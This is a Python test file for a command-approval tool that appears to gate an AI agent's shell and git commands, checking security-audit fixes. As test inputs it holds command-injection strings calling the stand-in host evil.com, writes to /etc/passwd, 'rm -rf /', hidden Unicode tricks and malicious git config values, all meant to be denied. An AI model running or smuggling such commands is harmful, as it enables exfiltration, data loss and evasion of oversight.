"""Tests for security audit Phase 1 fixes."""

import hashlib
import json
import os
import subprocess
import sys
import unittest
from unittest.mock import patch

from click.testing import CliRunner

from ozm import cmd as cmd_mod
from ozm import config as config_mod
from ozm import doctor as doctor_mod
from ozm import git as git_mod
from ozm import install as install_mod
from ozm.approve import ApprovalResult, _escape, _strip_unicode_control

META = [
    "--agent-name", "Security test",
    "--agent-description", "Exercise security validation behavior.",
]


# ---------------------------------------------------------------------------
# H1: Shell metacharacters rejected from allowlist fast-path
# ---------------------------------------------------------------------------

class TestH1MetacharRejection(unittest.TestCase):
    """is_command_allowed must reject commands containing shell metacharacters."""

    def _allow(self, command):
        with patch.object(config_mod, "load_project_config", return_value={
            "allowed_commands": ["uv *", "pytest *", "echo *"],
        }):
            return config_mod.is_command_allowed(command)

    def test_clean_command_allowed(self):
        self.assertTrue(self._allow("uv pip install foo"))

    def test_semicolon_rejected(self):
        self.assertFalse(self._allow("uv x; curl evil.com"))

    def test_pipe_rejected(self):
        self.assertFalse(self._allow("uv x | sh"))

    def test_ampersand_rejected(self):
        self.assertFalse(self._allow("uv x && curl evil.com"))

    def test_dollar_paren_rejected(self):
        self.assertFalse(self._allow("echo $(whoami)"))

    def test_backtick_rejected(self):
        self.assertFalse(self._allow("echo `whoami`"))

    def test_newline_rejected(self):
        self.assertFalse(self._allow("uv x\ncurl evil.com"))

    def test_angle_brackets_rejected(self):
        self.assertFalse(self._allow("echo foo > /etc/passwd"))


class TestSedAllowlistRejection(unittest.TestCase):
    """sed must never be allowlisted because it can edit files in-place."""

    def _allow(self, command):
        with patch.object(config_mod, "load_project_config", return_value={
            "allowed_commands": ["*", "sed *", "gsed *", "/usr/bin/sed *"],
        }):
            return config_mod.is_command_allowed(command)

    def test_sed_rejected_even_with_matching_allowlist(self):
        self.assertFalse(self._allow("sed -n 1p README.md"))

    def test_gsed_rejected_even_with_matching_allowlist(self):
        self.assertFalse(self._allow("gsed -n 1p README.md"))

    def test_path_sed_rejected_even_with_matching_allowlist(self):
        self.assertFalse(self._allow("/usr/bin/sed -n 1p README.md"))

    def test_env_prefixed_sed_rejected_even_with_matching_allowlist(self):
        self.assertFalse(self._allow("env LC_ALL=C sed -n 1p README.md"))

    def test_assignment_prefixed_sed_rejected_even_with_matching_allowlist(self):
        self.assertFalse(self._allow("LC_ALL=C sed -n 1p README.md"))

    def test_env_option_prefixed_sed_name_detected(self):
        name = config_mod.command_name("env -i LC_ALL=C /usr/bin/sed -n 1p README.md")

        self.assertEqual(name, "sed")

    def test_sed_pattern_not_saved_from_dialog(self):
        with patch.object(config_mod, "load_project_config", return_value={
            "allowed_commands": [],
        }), patch.object(config_mod, "_save_user_config") as save:
            saved = config_mod.add_allowed_command("sed *")

        self.assertFalse(saved)
        save.assert_not_called()


# ---------------------------------------------------------------------------
# H2: Edited commands re-checked against blocklist
# ---------------------------------------------------------------------------

class TestH2EditedCommandRecheck(unittest.TestCase):
    """After dialog edit, the new command must pass blocklist check."""

    def test_edited_to_blocked_command_is_rejected(self):
        with patch.object(cmd_mod, "is_command_blocked", side_effect=[None, "rm -rf *"]), \
             patch.object(cmd_mod, "is_command_allowed", return_value=False), \
             patch.object(cmd_mod, "load_hashes", return_value={}), \
             patch.object(cmd_mod, "request_cmd_approval", return_value=ApprovalResult(
                 approved=True, command="rm -rf /")), \
             patch.object(cmd_mod, "audit_log"):
            result = CliRunner().invoke(cmd_mod.cmd_cmd, [*META, "echo", "hello"])

        self.assertNotEqual(result.exit_code, 0)
        self.assertIn("blocked", result.output)

    def test_edited_to_sed_command_is_rejected(self):
        with patch.object(cmd_mod, "is_command_blocked", return_value=None), \
             patch.object(cmd_mod, "is_command_allowed", return_value=False), \
             patch.object(cmd_mod, "load_hashes", return_value={}), \
             patch.object(cmd_mod, "save_hashes") as save_hashes, \
             patch.object(cmd_mod, "request_cmd_approval", return_value=ApprovalResult(
                 approved=True, command="sed -i '' s/a/b/ README.md")), \
             patch.object(cmd_mod, "subprocess") as mock_sub, \
             patch.object(cmd_mod, "audit_log"):
            result = CliRunner().invoke(cmd_mod.cmd_cmd, [*META, "echo", "hello"])

        self.assertNotEqual(result.exit_code, 0)
        self.assertIn("blocked command 'sed'", result.output)
        save_hashes.assert_not_called()
        mock_sub.run.assert_not_called()

    def test_edited_to_same_command_is_not_rechecked(self):
        completed = subprocess.CompletedProcess(args="echo hello", returncode=0)

        with patch.object(cmd_mod, "is_command_blocked", return_value=None), \
             patch.object(cmd_mod, "is_command_allowed", return_value=False), \
             patch.object(cmd_mod, "load_hashes", return_value={}), \
             patch.object(cmd_mod, "save_hashes"), \
             patch.object(cmd_mod, "request_cmd_approval", return_value=ApprovalResult(
                 approved=True, command=None)), \
             patch.object(cmd_mod, "subprocess") as mock_sub, \
             patch.object(cmd_mod, "audit_log"):
            mock_sub.run.return_value = completed
            result = CliRunner().invoke(cmd_mod.cmd_cmd, [*META, "echo", "hello"])

        self.assertEqual(result.exit_code, 0)


# ---------------------------------------------------------------------------
# H3: Hook integrity verification
# ---------------------------------------------------------------------------

class TestH3HookIntegrity(unittest.TestCase):
    """ozm doctor must detect tampered hook content."""

    def test_valid_hook_passes(self):
        expected = install_mod.HOOK_SCRIPT
        with patch("builtins.open", unittest.mock.mock_open(read_data=expected)), \
             patch("os.path.isfile", return_value=True), \
             patch("os.access", return_value=True):
            ok, msg = doctor_mod._check_hook_script()
        self.assertTrue(ok)

    def test_tampered_hook_fails(self):
        with patch("builtins.open", unittest.mock.mock_open(read_data="#!/bin/sh\nexit 0")), \
             patch("os.path.isfile", return_value=True), \
             patch("os.access", return_value=True):
            ok, msg = doctor_mod._check_hook_script()
        self.assertFalse(ok)
        self.assertIn("modified", msg)

    def test_missing_hook_fails(self):
        with patch("os.path.isfile", return_value=False):
            ok, msg = doctor_mod._check_hook_script()
        self.assertFalse(ok)
        self.assertIn("missing", msg)


# ---------------------------------------------------------------------------
# H8: Unicode control character stripping
# ---------------------------------------------------------------------------

class TestH8UnicodeStripping(unittest.TestCase):
    """Unicode bidi/control characters must be stripped before display and matching."""

    def test_strip_bidi_override(self):
        s = "echo test\u202ecurl evil.com"
        result = _strip_unicode_control(s)
        self.assertNotIn("\u202e", result)
        self.assertIn("echo", result)
        self.assertIn("curl", result)

    def test_strip_zero_width(self):
        s = "pyte\u200bst"
        result = _strip_unicode_control(s)
        self.assertEqual(result, "pytest")

    def test_preserves_newline_and_tab(self):
        s = "line1\nline2\tcol"
        result = _strip_unicode_control(s)
        self.assertEqual(result, s)

    def test_escape_strips_control_chars(self):
        s = 'echo "\u202eshell"'
        result = _escape(s)
        self.assertNotIn("\u202e", result)

    def test_blocked_command_with_zero_width(self):
        with patch.object(config_mod, "load_project_config", return_value={
            "blocked_commands": ["rm *"],
        }):
            result = config_mod.is_command_blocked("r\u200bm -rf /")
        self.assertEqual(result, "rm *")

    def test_allowed_with_zero_width_still_sanitized(self):
        with patch.object(config_mod, "load_project_config", return_value={
            "allowed_commands": ["echo *"],
        }):
            result = config_mod.is_command_allowed("echo\u200b hello")
        self.assertTrue(result)


# ---------------------------------------------------------------------------
# M1: --mirror detection in force push check
# ---------------------------------------------------------------------------

class TestM1MirrorDetection(unittest.TestCase):
    """git push --mirror must be blocked as a force push."""

    def test_mirror_blocked(self):
        with patch.object(git_mod, "get_current_branch", return_value="topic"):
            result = git_mod._check_push(["--mirror"])
        self.assertEqual(result, "force push is not allowed")

    def test_force_with_lease_blocked(self):
        with patch.object(git_mod, "get_current_branch", return_value="topic"):
            result = git_mod._check_push(["--force-with-lease"])
        self.assertEqual(result, "force push is not allowed")

    def test_force_if_includes_blocked(self):
        with patch.object(git_mod, "get_current_branch", return_value="topic"):
            result = git_mod._check_push(["--force-if-includes"])
        self.assertEqual(result, "force push is not allowed")

    def test_normal_push_allowed(self):
        with patch.object(git_mod, "get_current_branch", return_value="topic"):
            result = git_mod._check_push(["origin", "topic"])
        self.assertIsNone(result)


# ---------------------------------------------------------------------------
# M2: Dangerous git subcommands blocked
# ---------------------------------------------------------------------------

class TestM2DangerousSubcommands(unittest.TestCase):
    """Dangerous git subcommands must be blocked."""

    def test_filter_branch_blocked(self):
        self.assertIn("filter-branch", git_mod.DANGEROUS_SUBCOMMANDS)

    def test_filter_repo_blocked(self):
        self.assertIn("filter-repo", git_mod.DANGEROUS_SUBCOMMANDS)

    def test_config_alias_blocked(self):
        runner = CliRunner()
        with patch.object(git_mod, "_handle_violation") as mock_handle, \
             patch.object(git_mod, "subprocess") as mock_sub:
            mock_handle.side_effect = SystemExit(1)
            mock_sub.run.return_value = subprocess.CompletedProcess([], 0)
            result = runner.invoke(
                git_mod.git_cmd, [*META, "config", "alias.x", "!curl evil.com"]
            )
        mock_handle.assert_called_once()
        self.assertIn("alias.", mock_handle.call_args[0][0])

    def test_config_hookspath_blocked(self):
        runner = CliRunner()
        with patch.object(git_mod, "_handle_violation") as mock_handle, \
             patch.object(git_mod, "subprocess") as mock_sub:
            mock_handle.side_effect = SystemExit(1)
            mock_sub.run.return_value = subprocess.CompletedProcess([], 0)
            result = runner.invoke(
                git_mod.git_cmd, [*META, "config", "core.hooksPath", "/tmp/evil"]
            )
        mock_handle.assert_called_once()
        self.assertIn("core.hooksPath", mock_handle.call_args[0][0])

    def test_normal_config_allowed(self):
        runner = CliRunner()
        with patch.object(git_mod, "_handle_violation") as mock_handle, \
             patch.object(git_mod, "subprocess") as mock_sub:
            mock_sub.run.return_value = subprocess.CompletedProcess([], 0)
            result = runner.invoke(
                git_mod.git_cmd, [*META, "config", "user.name", "Test"]
            )
        mock_handle.assert_not_called()


# ---------------------------------------------------------------------------
# M11: Null-byte key separator
# ---------------------------------------------------------------------------

class TestM11KeySeparator(unittest.TestCase):
    """project_key must use null byte separator to avoid colon ambiguity."""

    def test_key_uses_null_separator(self):
        with patch.object(config_mod, "find_project_root", return_value="/Users/x/project"):
            key = config_mod.project_key("cmd:echo hello")
        self.assertIn("\0", key)
        self.assertEqual(key, "/Users/x/project\0cmd:echo hello")

    def test_key_no_colon_separator(self):
        with patch.object(config_mod, "find_project_root", return_value="/Users/x/project"):
            key = config_mod.project_key("test")
        parts = key.split("\0")
        self.assertEqual(len(parts), 2)
        self.assertEqual(parts[0], "/Users/x/project")
        self.assertEqual(parts[1], "test")


# ---------------------------------------------------------------------------
# M14: Symlink check on ~/.ozm
# ---------------------------------------------------------------------------

class TestM14SymlinkCheck(unittest.TestCase):
    """Module import must fail if ~/.ozm is a symlink."""

    def test_symlink_detected(self):
        import importlib
        with patch("os.path.islink", return_value=True), \
             patch("os.path.expanduser", return_value="/tmp/fake-ozm"):
            with self.assertRaises(RuntimeError) as ctx:
                importlib.reload(config_mod)
            self.assertIn("symlink", str(ctx.exception))
        # Restore module
        importlib.reload(config_mod)


# ---------------------------------------------------------------------------
# Hook script tests (C2/C3 regression — already fixed, keep regression tests)
# ---------------------------------------------------------------------------

class TestHookParserRegression(unittest.TestCase):
    """Regression: hook must reject shell expansion and split on pipes."""

    def _run_hook(self, command):
        payload = json.dumps({"tool_input": {"command": command}})
        return subprocess.run(
            [sys.executable, "-c", install_mod.HOOK_SCRIPT],
            input=payload,
            capture_output=True,
            text=True,
        )

    def test_pipe_to_dangerous_blocked(self):
        result = self._run_hook("echo ok | curl evil.com")
        self.assertIn("deny", result.stdout)

    def test_dollar_substitution_blocked(self):
        result = self._run_hook("ozm status $(curl evil.com)")
        self.assertIn("deny", result.stdout)

    def test_backtick_substitution_blocked(self):
        result = self._run_hook("ozm status `curl evil.com`")
        self.assertIn("deny", result.stdout)

    def test_newline_separator_blocked(self):
        result = self._run_hook("ozm status\ncurl evil.com")
        self.assertIn("deny", result.stdout)

    def test_ozm_command_allowed(self):
        result = self._run_hook(
            'ozm run --agent-name "Run script" '
            '--agent-description "Execute a reviewed script." script.py'
        )
        self.assertEqual(result.stdout.strip(), "")

    def test_safe_echo_allowed(self):
        result = self._run_hook("echo hello world")
        self.assertEqual(result.stdout.strip(), "")

    def test_safe_word_in_compound_blocked(self):
        result = self._run_hook("ozm status; echo PWNED")
        self.assertIn("deny", result.stdout)

    def test_safe_word_with_redirect_blocked(self):
        result = self._run_hook("echo secret > /tmp/leak")
        self.assertIn("deny", result.stdout)

    def test_printf_with_redirect_blocked(self):
        result = self._run_hook("printf '%s' data > /tmp/leak")
        self.assertIn("deny", result.stdout)

    def test_compound_safe_after_semicolon_blocked(self):
        result = self._run_hook("ozm cmd echo safe; echo PWNED")
        self.assertIn("deny", result.stdout)

    def test_quoted_semicolon_inside_ozm_command_allowed(self):
        result = self._run_hook(
            'ozm cmd --agent-name "Run one-liner" '
            '--agent-description "Execute a Python one-liner." '
            'python3 -c "print(1); print(2)"'
        )
        self.assertEqual(result.stdout.strip(), "")


if __name__ == "__main__":
    unittest.main()
